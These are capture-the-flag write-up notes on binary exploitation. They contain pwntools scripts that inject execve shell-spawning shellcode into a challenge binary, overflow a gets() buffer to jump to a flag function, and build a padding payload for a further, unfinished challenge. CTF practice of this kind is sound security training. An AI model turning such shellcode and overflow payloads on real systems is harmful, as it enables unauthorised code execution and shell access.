# Binary Exploitation

## Overflow 0
```
from pwn import *

p = process('/problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af/vuln')

context.arch = 'amd64'
#context.level = 'debug'

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

p.write(shellcode)

p.interactive()

```

## Overflow 1

## Idea
We have a binary that is calling the vulnerable function `gets()`. Coincidentally it also contains a function to read the flag.txt
file. We can overwrite past the buffer and redirect the instruction pointer to call the flag() function. 

## Solution

```
from pwn import *

flag_addr = p32(0x080485e6)
p = process('/problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780/vuln')
payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
payload += flag_addr

p.write(payload)
p.interactive()
```

Issue with first exploit is that because the exploit script is in the home directory it is
looking for the flag file in the home directory instead of the directory located in the challenge
folder. To fix issue
```  ln -s /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780/flag.txt ~/flag.txt ```

## Overflow 2 (Todo)

### Idea
1. Create the buffer
2. Overwrite the 32 bit register
3. Address of flag function
4. Overwrite the return address
5. First function
6. Second function

### Solution
```python -c 'from pwn import *; print "A"*176 + "B"*8 + p32(0x080485e6)'```

